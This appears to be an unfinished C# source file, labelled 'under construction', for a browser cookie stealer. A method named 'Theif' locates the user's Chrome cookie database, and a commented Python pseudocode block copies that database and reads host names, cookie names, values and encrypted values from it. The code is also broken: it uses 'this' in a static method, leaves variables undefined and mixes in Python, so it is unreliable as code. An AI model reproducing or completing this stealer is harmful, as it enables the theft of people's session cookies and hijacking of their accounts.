using System.Web;
using System.Data.SQLite;

namespace gigas;


// file under construction
public class Cookie
{
    public static void Theif()
    {
        
        string usr = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        
        string dbp = usr + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies";
        Microsoft.Practices.EnterpriseLibrary.Data.Sql.SqlDatabase(this.connectionString);       
        String querystring = null;
        
        // psudeo code to impl later
        /*
          db_copy = db_path + '_copy'
    shutil.copyfile(db_path, db_copy)

    # Connect to the database
    conn = sqlite3.connect(db_copy)
    cursor = conn.cursor()

    # Fetch the cookies
    query = "SELECT host_key, name, value, encrypted_value FROM cookies WHERE host_key = ?"
    cursor.execute(query, (host_key,))
    cookies = cursor.fetchall()
         */
        
        

        
    }
}